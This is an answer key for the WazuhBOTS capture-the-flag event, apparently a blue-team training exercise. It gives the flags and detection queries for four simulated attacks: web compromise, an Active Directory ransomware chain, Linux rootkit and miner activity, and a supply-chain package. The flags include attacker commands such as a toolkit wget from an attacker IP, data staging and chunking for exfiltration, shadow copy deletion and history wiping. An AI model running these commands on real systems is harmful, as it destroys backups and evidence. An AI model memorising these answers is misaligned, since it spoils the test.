# WazuhBOTS -- Answer Key

> **CONFIDENTIAL** -- This document contains all 150 challenge flags and is intended for event organizers and verifiers only. Do not distribute to participants.

**Total:** 150 challenges | 39,200 base points
**Verification:** `python3 scripts/verify_flags.py --all --verbose`

> **Query Isolation:** All queries use `_index: wazuh-alerts-4.x-YYYY.MM.DD` to scope results to the correct scenario date. This prevents cross-scenario contamination since hosts appear in multiple scenarios (web-srv in S1+S4, dc-srv in S2+S4, lnx-srv in S3+S4). S4 queries using S4-specific fields (pip, cloud-metrics, etc.) are inherently isolated and omit the index prefix.

---

## Scenario 1: Operation Dark Harvest

**Attack:** Web Application Compromise (SQLi, web shell, privilege escalation, data exfiltration)
**Victim:** `web-srv` (Agent 001 / 172.26.0.30)
**Attacker:** 198.51.100.23 (Moscow, Russia)
**Timeframe:** 2026-03-01
**Alerts:** 900

### Pup (100 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 1 | S1-PUP-01 | High-Severity Alert Count | `247` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.level >= 10` → count hits |
| 2 | S1-PUP-02 | Top Attacker IP Address | `198.51.100.23` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv` → terms agg on `data.srcip`, top 1 |
| 3 | S1-PUP-03 | First SQLi Detection Rule | `31103` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND (rule.description: *sql* OR rule.id: (31103 OR 87900 OR 87901 OR 87902))` → sort asc, first `rule.id` |
| 4 | S1-PUP-04 | Nikto Scan Alert Count | `180` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 31101` → count hits |
| 5 | S1-PUP-05 | Web Log Source Location | `/var/log/apache2/access.log` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND location: *apache*` → read `location` field |
| 6 | S1-PUP-06 | SQL Injection Alert Total | `188` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: (31103 OR 87900 OR 87901 OR 87902 OR 87905)` → count hits |
| 7 | S1-PUP-07 | FIM New Files Detected | `2` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 554` → count hits |
| 8 | S1-PUP-08 | Reconnaissance Scanner Name | `Nikto` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND full_log: *Nikto*` → extract scanner name |
| 9 | S1-PUP-09 | Maximum Rule Severity Level | `15` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv` → max agg on `rule.level` |
| 10 | S1-PUP-10 | Target Agent Name | `web-srv` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv` → read `agent.name` |

### Hunter (200 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 11 | S1-HNT-01 | Reconnaissance User-Agent | `Nikto/2.1.6` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND full_log: *Nikto*` → extract User-Agent string |
| 12 | S1-HNT-02 | Uploaded Web Shell Filename | `cmd.php` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND syscheck.path: *cmd.php*` → extract filename |
| 13 | S1-HNT-03 | Post-Escalation Command | `id` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 5402 AND data.command: id` |
| 14 | S1-HNT-04 | SQLi Exploitation User-Agent | `sqlmap/1.7.2` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND full_log: *sqlmap*` → extract User-Agent |
| 15 | S1-HNT-05 | Web Shell Full Path | `/var/www/html/dvwa/hackable/uploads/cmd.php` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND syscheck.path: *cmd.php*` → full path |
| 16 | S1-HNT-06 | Sudo Command Count | `23` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 5402` → count hits |
| 17 | S1-HNT-07 | Cron Persistence File Path | `/var/spool/cron/crontabs/root` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND full_log: *cron* AND full_log: *spool*` → read path |
| 18 | S1-HNT-08 | Data Staging Command | `tar czf /tmp/.cache/loot.tar.gz /tmp/.cache/dvwa_dump.sql` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.command: tar*` → exact `data.command` |
| 19 | S1-HNT-09 | Exfiltration Destination Port | `4444` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.dstport: 4444` |
| 20 | S1-HNT-10 | HTTP POST Request Count | `51` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.srcip: 198.51.100.23 AND data.http_method: POST` → count hits |

### Alpha (300 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 21 | S1-ALP-01 | MITRE Persistence Technique ID | `T1053.003` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.mitre.id: T1053*` → read `rule.mitre.id` |
| 22 | S1-ALP-02 | Custom Correlation Rule | `87901` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 87901` |
| 23 | S1-ALP-03 | Exfiltrated Database Table | `mysqldump -u root dvwa users` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.command: *mysqldump*` → exact value |
| 24 | S1-ALP-04 | Reconnaissance Start Timestamp | `2026-03-01T08:14:23Z` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.srcip: 198.51.100.23` → sort asc, first timestamp |
| 25 | S1-ALP-05 | SQLi MITRE Technique ID | `T1190` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: (31103 OR 87900)` → read `rule.mitre.id` |
| 26 | S1-ALP-06 | Correlation Chain Max Rule ID | `88002` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.groups: correlation` → max `rule.id` |
| 27 | S1-ALP-07 | Web Shell MD5 Hash | `d41d8cd98f00b204e9800998ecf8427e` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND syscheck.path: *cmd.php*` → read `syscheck.md5_after` |
| 28 | S1-ALP-08 | Distinct MITRE Techniques Count | `9` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.mitre.id: *` → cardinality agg on `rule.mitre.id` |
| 29 | S1-ALP-09 | HTTP 500 Error Count | `43` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.http_status_code: 500` → count hits |

### Fenrir (500 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 30 | S1-FNR-01 | FIM Evasion Technique | `timestomping:/var/ossec/etc/ossec.conf:whodata` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 87963` → timestomping; config=whodata |
| 31 | S1-FNR-02 | Complete Attack Timeline | `2026-03-01T08:14:23Z\|2026-03-01T19:47:51Z` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.srcip: 198.51.100.23` → sort asc first + desc last |
| 32 | S1-FNR-03 | Timestomped Files | `/var/ossec/etc/ossec.conf\|/var/www/html/dvwa/hackable/uploads/cmd.php` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.id: 87963` → terms agg on `syscheck.path` |
| 33 | S1-FNR-04 | Base64 Staging Command | `base64 /tmp/.cache/loot.tar.gz > /tmp/.cache/loot.b64` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.command: *base64*` → exact value |
| 34 | S1-FNR-05 | Exfiltration Chunk Command | `split -b 512k /tmp/.cache/loot.b64 /tmp/.cache/chunk_` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.command: split*` → exact value |
| 35 | S1-FNR-06 | Complete Correlation Rule Sequence | `87901\|88000\|88001\|88002` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND rule.groups: correlation` → sort by timestamp, list `rule.id` |
| 36 | S1-FNR-07 | Exfiltration URL Base | `http://198.51.100.23:4444` | `_index: wazuh-alerts-4.x-2026.03.01 AND agent.name: web-srv AND data.dstport: 4444` → reconstruct URL from dstip+dstport |

---

## Scenario 2: Operation Iron Gate

**Attack:** Active Directory Attack Chain (phishing, Mimikatz, Kerberoasting, lateral movement, ransomware)
**Victim:** `dc-srv` (Agent 002 / 172.26.0.32)
**Attacker:** 172.25.0.104 (WS-FINANCE01, user jmartin)
**Timeframe:** 2026-03-02
**Alerts:** 1,200

### Pup (100 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 1 | S2-PUP-01 | Phishing Target User | `jmartin` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.targetUserName: jmartin` |
| 2 | S2-PUP-02 | Initial Payload Host IP | `172.25.0.104` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv` → inspect `data` for initial payload host IP |
| 3 | S2-PUP-03 | Suspicious Process Rule ID | `92052` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.id: 92052` |
| 4 | S2-PUP-04 | High-Severity Alert Count | `22` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.level >= 10` → count hits |
| 5 | S2-PUP-05 | Active Directory Domain | `wazuhbots.local` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND full_log: *wazuhbots.local*` |
| 6 | S2-PUP-06 | Compromised Workstation Name | `WS-FINANCE01` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.workstationName: *` → find non-DC name |
| 7 | S2-PUP-07 | Sysmon Event Channel | `Microsoft-Windows-Sysmon/Operational` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND location: *Sysmon*` → read `location` |
| 8 | S2-PUP-08 | Ransomware FIM Event Count | `20` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND syscheck.path: *.locked*` → count hits |
| 9 | S2-PUP-09 | PowerShell Logging Event ID | `4104` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: 4104` |
| 10 | S2-PUP-10 | Ransomware File Extension | `.locked` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND syscheck.path: *.locked*` → extract extension |

### Hunter (200 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 11 | S2-HNT-01 | Credential Dumping Tool | `mimikatz.exe` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND full_log: *mimikatz*` → extract executable name |
| 12 | S2-HNT-02 | Lateral Movement Host Count | `4` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.dstip: * AND NOT data.dstip: 172.26.0.32` → cardinality agg on `data.dstip` |
| 13 | S2-HNT-03 | Kerberoasting Target SPN | `MSSQLSvc/db-srv.wazuhbots.local:1433` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.serviceName: *MSSQLSvc*` → read SPN |
| 14 | S2-HNT-04 | Mimikatz File Path | `C:\Users\jmartin\AppData\Local\Temp\mimikatz.exe` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.sourceImage: *mimikatz*` → full path |
| 15 | S2-HNT-05 | LSASS Access Mask | `0x1010` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.grantedAccess: *` → read value |
| 16 | S2-HNT-06 | First Lateral Target IP | `172.26.0.30` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.dstip: * AND NOT data.dstip: 172.26.0.32` → sort asc, first `data.dstip` |
| 17 | S2-HNT-07 | Ransomware Process Path | `C:\Windows\Temp\payload.exe` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.image: *payload.exe*` → full path |
| 18 | S2-HNT-08 | Ransom Note Filename | `DECRYPT_FILES.txt` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND syscheck.path: *DECRYPT*` → extract filename |
| 19 | S2-HNT-09 | Kerberos Encryption Type | `0x17` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.ticketEncryptionType: *` → read value (RC4) |
| 20 | S2-HNT-10 | Malicious Service Name | `SvcUpdate` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: 7045` → read `data.win.eventdata.serviceName` |

### Alpha (300 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 21 | S2-ALP-01 | Pass-the-Hash Event ID | `4624` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: 4624` → PtH logon event |
| 22 | S2-ALP-02 | Ransomware Detection Rule | `87905` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.level >= 12` → read `rule.id` |
| 23 | S2-ALP-03 | Malicious Executable Hash | `a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND syscheck.sha256_after: *` → ransomware SHA256 |
| 24 | S2-ALP-04 | AMSI Bypass Event Count | `3` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.id: 91802` → count hits |
| 25 | S2-ALP-05 | Mimikatz Module Sequence | `sekurlsa::logonpasswords\|sekurlsa::wdigest\|lsadump::sam` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.commandLine: *mimikatz*` → sort asc, extract modules |
| 26 | S2-ALP-06 | Shadow Copy Deletion Command | `vssadmin delete shadows /all /quiet` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.commandLine: *vssadmin*` → exact value |
| 27 | S2-ALP-07 | Lateral Movement User Account | `da_backup` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.dstip: * AND data.win.eventdata.targetUserName: *` → lateral user |
| 28 | S2-ALP-08 | Ransomware MITRE Techniques | `T1486\|T1490` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.id: 87905` → read `rule.mitre.id` |
| 29 | S2-ALP-09 | Scheduled Task Persistence | `\WazuhBOTS\UpdateCheck` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: 4698` → read `data.win.eventdata.taskName` |

### Fenrir (500 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 30 | S2-FNR-01 | AMSI Bypass String | `AmsiScanBuffer` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: 4104 AND full_log: *Amsi*` → extract bypass string |
| 31 | S2-FNR-02 | Kerberoasting Correlation Rule | `87910` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.id: 87910` |
| 32 | S2-FNR-03 | Phishing Document Filename | `Q1_Report.docm` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.eventdata.parentCommandLine: *.docm*` → extract filename |
| 33 | S2-FNR-04 | Complete Lateral Movement IP Sequence | `172.26.0.30\|172.26.0.31\|172.26.0.33\|172.26.0.34\|172.26.0.35\|172.26.0.36` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.dstip: * AND NOT data.dstip: 172.26.0.32` → sort asc, unique `data.dstip` |
| 34 | S2-FNR-05 | Encrypted Directory List | `C:\Shares\Finance\|C:\Shares\HR\|C:\Shares\IT\|C:\Users\Public\Documents` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND syscheck.path: *.locked*` → terms agg on parent directory |
| 35 | S2-FNR-06 | Full Attack Timeline | `2026-03-02T09:12:00Z\|2026-03-02T15:12:05Z` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND rule.level >= 10` → sort asc first + desc last timestamp |
| 36 | S2-FNR-07 | Complete Windows Event ID Chain | `1\|10\|4104\|4624\|4634\|4648\|4672\|4688\|4698\|4769\|5145\|5156\|7045` | `_index: wazuh-alerts-4.x-2026.03.02 AND agent.name: dc-srv AND data.win.system.eventID: *` → terms agg, sort numerically |

---

## Scenario 3: Ghost in the Shell

**Attack:** Linux Server Compromise (SSH brute force, rootkit, C2, cryptominer)
**Victim:** `lnx-srv` (Agent 003 / 172.26.0.31)
**Attacker:** 203.0.113.42 (Moscow, Russia)
**Timeframe:** 2026-03-03
**Alerts:** 9,000

### Pup (100 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 1 | S3-PUP-01 | SSH Brute Force Count | `8347` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716) AND data.srcip: 203.0.113.42` → count hits |
| 2 | S3-PUP-02 | Attack Origin Country | `Russia` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.GeoLocation.country_name: Russia` → check GeoIP country |
| 3 | S3-PUP-03 | Successful Login Timestamp | `2026-03-03T05:23:41Z` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 5715` → read timestamp |
| 4 | S3-PUP-04 | Attacker IP Address | `203.0.113.42` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716)` → terms agg on `data.srcip`, top external IP |
| 5 | S3-PUP-05 | Brute Force Primary Rule ID | `5710` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716)` → check primary brute-force `rule.id` |
| 6 | S3-PUP-06 | Attack Origin City | `Moscow` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.GeoLocation.city_name: Moscow` → check GeoIP city |
| 7 | S3-PUP-07 | High-Severity Alert Count | `207` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.level >= 10` → count hits |
| 8 | S3-PUP-08 | Brute Force Start Time | `2026-03-03T02:00:00Z` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716)` → sort asc, first timestamp |
| 9 | S3-PUP-09 | FIM Rule Description | `Integrity checksum changed` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 550` → read `rule.description` |
| 10 | S3-PUP-10 | SSH Login Source Port | `48231` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 5715` → read `data.srcport` |

### Hunter (200 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 11 | S3-HNT-01 | Compromised User Account | `deploy` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 5715` → read `data.srcuser` |
| 12 | S3-HNT-02 | Malicious Toolkit Download URL | `http://203.0.113.100/tools/linpeas_kit.tar.gz` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.command: *linpeas*` → extract URL from command |
| 13 | S3-HNT-03 | System File Modification Rule | `550:Integrity checksum changed` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 550` → read `rule.id:rule.description` |
| 14 | S3-HNT-04 | Toolkit wget Command | `wget http://203.0.113.100/tools/linpeas_kit.tar.gz -O /tmp/linpeas_kit.tar.gz` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.command: *wget*linpeas*` → exact `data.command` |
| 15 | S3-HNT-05 | Toolkit Extraction Path | `/tmp/.tools/` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.command: *tar* AND data.command: *.tools*` → extract extraction path |
| 16 | S3-HNT-06 | FIM Modified File Count | `21` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 550` → count hits (distinct `syscheck.path`) |
| 17 | S3-HNT-07 | C2 DNS Domain | `update.systemnodes.net` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.query_name: *systemnodes*` → read `data.query_name` |
| 18 | S3-HNT-08 | Cryptominer Pool Port | `3333` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.dstport: 3333` → cryptominer pool port |
| 19 | S3-HNT-09 | History Clearing Command | `history -c; > ~/.bash_history` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.command: *history*` → exact `data.command` |
| 20 | S3-HNT-10 | SSH Program Name | `sshd` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5715)` → read `data.program_name` |

### Alpha (300 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 21 | S3-ALP-01 | Rootkit Kernel Module Name | `syshook.ko` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 87943` → extract rootkit module name |
| 22 | S3-ALP-02 | C2 Channel Port and Protocol | `8443/tcp` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.dstport: 8443` → read port + protocol |
| 23 | S3-ALP-03 | Auditd Rules for Module Loading | `modules` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.audit.key: modules` → auditd rule key |
| 24 | S3-ALP-04 | Rootkit Detection Rule ID | `87943` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 87943` → rootkit detection rule |
| 25 | S3-ALP-05 | MITRE Technique for Brute Force | `T1110.001` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 5710` → read `rule.mitre.id` |
| 26 | S3-ALP-06 | Critical System Files Modified | `4` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 550 AND syscheck.path: /etc/*` → cardinality agg on `syscheck.path` |
| 27 | S3-ALP-07 | C2 Beaconing Alert Count | `30` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: 87953` → count hits |
| 28 | S3-ALP-08 | Timestomping MITRE Technique | `T1070.006` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.mitre.id: T1070*` → timestomping technique |
| 29 | S3-ALP-09 | Rootkit Auditd Executable Path | `/sbin/insmod` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.audit.exe: *insmod*` → read `data.audit.exe` |

### Fenrir (500 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 30 | S3-FNR-01 | Log Tampering and Timestomping | `/var/log/auth.log:7200` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND syscheck.path: /var/log/auth.log AND syscheck.diff_seconds: 7200` → path + time diff |
| 31 | S3-FNR-02 | Complete IOC Chain | `203.0.113.42\|203.0.113.100\|update.systemnodes.net\|stratum.cryptopool.xyz` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.level >= 10` → collect all external IPs + domains |
| 32 | S3-FNR-03 | Brute Force Duration | `204` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716)` → (last_ts - first_ts) / 60 |
| 33 | S3-FNR-04 | Rootkit Auditd Syscall | `init_module` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND data.audit.syscall: *module*` → read `data.audit.syscall` |
| 34 | S3-FNR-05 | Distinct Brute Force Usernames | `20` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.id: (5710 OR 5716) AND data.srcip: 203.0.113.42` → cardinality agg on `data.srcuser` |
| 35 | S3-FNR-06 | Anti-Forensics MITRE Chain | `T1070.003\|T1070.006` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv AND rule.groups: (anti_forensics OR log_tampering)` → collect `rule.mitre.id` |
| 36 | S3-FNR-07 | Full Network IOC Extraction | `203.0.113.42\|203.0.113.100\|93.184.216.34\|update.systemnodes.net\|stratum.cryptopool.xyz` | `_index: wazuh-alerts-4.x-2026.03.03 AND agent.name: lnx-srv` → collect ALL unique external IPs + domains from every alert |

---

## Scenario 4: Supply Chain Phantom

**Attack:** Multi-Vector Supply Chain Attack (dependency confusion, DNS tunneling, multi-host exfiltration, anti-forensics)
**Victims:** `web-srv` (001), `dc-srv` (002), `lnx-srv` (003)
**Malicious Package:** `wazuhbots-utils` v1.3.7 (pip)
**C2 Domains:** cdn-analytics.cloud-metrics.net (DNS tunnel), cdn-static.cloud-metrics.net (exfil)
**Timeframe:** 2026-03-05 to 2026-03-06
**Alerts:** 600

### Pup (100 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 1 | S4-PUP-01 | Total Hosts Infected | `3` | `data.command: *wazuhbots-utils*` → cardinality agg on `agent.name` |
| 2 | S4-PUP-02 | Package Manager Used | `pip` | `data.command: *pip*install*wazuhbots*` → extract package manager |
| 3 | S4-PUP-03 | Attack Start Date | `2026-03-05` | `(_index: wazuh-alerts-4.x-2026.03.05 OR _index: wazuh-alerts-4.x-2026.03.06) AND rule.level >= 10` → first high-severity alert date |
| 4 | S4-PUP-04 | Persistence Service Name | `svc_update.service` | `full_log: *svc_update.service*` → extract systemd service name |
| 5 | S4-PUP-05 | First Host Infected | `web-srv` | `data.command: *wazuhbots-utils*` → sort asc, first `agent.name` |
| 6 | S4-PUP-06 | DNS Tunnel Alerts Per Host | `40` | `rule.id: 87950 AND agent.name: web-srv` → count hits |
| 7 | S4-PUP-07 | Backdoor Script Filename | `svc_update.py` | `syscheck.path: *svc_update*` → extract backdoor filename |
| 8 | S4-PUP-08 | Logrotate Target Config | `/etc/logrotate.d/wazuh` | `syscheck.path: *logrotate*` → full path |
| 9 | S4-PUP-09 | Malicious Package Version | `1.3.7` | `data.pip.package_version: *` → read `data.pip.package_version` |
| 10 | S4-PUP-10 | Pip Install User | `root` | `data.command: *pip*install*` → read `data.srcuser` |

### Hunter (200 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 11 | S4-HNT-01 | Infection Time Spread | `390` | `data.command: *wazuhbots-utils*` → sort asc, (last_ts - first_ts) / 60 |
| 12 | S4-HNT-02 | DC-SRV Infection Timestamp | `2026-03-05T06:31:07Z` | `agent.name: dc-srv AND data.command: *wazuhbots-utils*` → sort asc, first timestamp |
| 13 | S4-HNT-03 | DNS Tunnel Base Domain | `cdn-analytics.cloud-metrics.net` | `rule.id: 87950` → read `data.base_domain` |
| 14 | S4-HNT-04 | Exfiltration URL Domain | `cdn-static.cloud-metrics.net` | `data.url: *cloud-metrics.net*` → extract exfil domain from URL |
| 15 | S4-HNT-05 | Web-SRV Exfil Volume | `312` | `agent.name: web-srv AND data.url: *cdn-static.cloud-metrics.net/api/v2/upload*` → sum `data.bytes_sent` → MB |
| 16 | S4-HNT-06 | Data Staging Directories | `/tmp/.cache/\|/dev/shm/` | `syscheck.path: (/tmp/.cache/* OR /dev/shm/*)` → identify staging dirs |
| 17 | S4-HNT-07 | Logrotate Changed Values | `rotate_0_maxage_1` | `syscheck.path: *logrotate*wazuh*` → read `data.logrotate.new_rotate` + `new_maxage` |
| 18 | S4-HNT-08 | Logrotate Force Command | `logrotate -f /etc/logrotate.d/wazuh` | `data.command: *logrotate*` → exact `data.command` |
| 19 | S4-HNT-09 | LNX-SRV Infection Timestamp | `2026-03-05T08:45:22Z` | `agent.name: lnx-srv AND data.command: *wazuhbots-utils*` → sort asc, first timestamp |
| 20 | S4-HNT-10 | Process Tree Parent | `pip` | `data.audit.ppid_exe: *pip*` → read `data.audit.ppid_exe` |

### Alpha (300 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 21 | S4-ALP-01 | Malicious Package Name | `wazuhbots-utils` | `data.command: *pip*install*` → extract package name |
| 22 | S4-ALP-02 | Post-Install Backdoor Script Path | `/usr/local/lib/python3.10/dist-packages/wazuhbots_utils/.config/svc_update.py` | `syscheck.path: *svc_update.py*` → full `syscheck.path` |
| 23 | S4-ALP-03 | DNS Tunneling Domain | `cdn-analytics.cloud-metrics.net` | `rule.id: 87950` → read `data.base_domain` |
| 24 | S4-ALP-04 | First Affected Host | `web-srv` | `data.command: *wazuhbots-utils*` → sort asc, first `agent.name` |
| 25 | S4-ALP-05 | DNS Query Total Across Hosts | `120` | `(_index: wazuh-alerts-4.x-2026.03.05 OR _index: wazuh-alerts-4.x-2026.03.06) AND rule.id: 87950` → count hits (all hosts) |
| 26 | S4-ALP-06 | MITRE Supply Chain Technique | `T1195.001` | `rule.mitre.id: T1195*` → supply chain technique |
| 27 | S4-ALP-07 | DC-SRV Exfil Volume | `287` | `agent.name: dc-srv AND data.url: *cdn-static.cloud-metrics.net/api/v2/upload*` → sum `data.bytes_sent` → MB |
| 28 | S4-ALP-08 | Backdoor File Owner UID | `0` | `syscheck.path: *svc_update.py*` → read `syscheck.uid_after` |
